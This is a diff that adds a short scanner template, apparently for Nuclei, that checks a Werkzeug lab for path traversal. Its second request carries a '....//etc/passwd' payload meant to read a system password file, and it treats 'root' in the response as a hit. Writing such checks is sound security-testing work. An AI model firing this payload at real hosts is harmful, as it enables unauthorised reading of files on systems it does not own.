@@ -1,0 +1,25 @@
+id: werkzeug_lab
+
+info:
+  name: Check SidneyJob and cherepawwka lab
+  author: SidneyJob
+  severity: low
+  description: Check correct werkzeug 
+
+http:
+  - raw:
+    - |
+      GET / HTTP/2
+      Host: {{Hostname}}
+
+    - |
+      GET /secret?usefilename=....//etc/passwd HTTP/2
+      Host: {{Hostname}}
+
+    
+    cookie-reuse: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root"
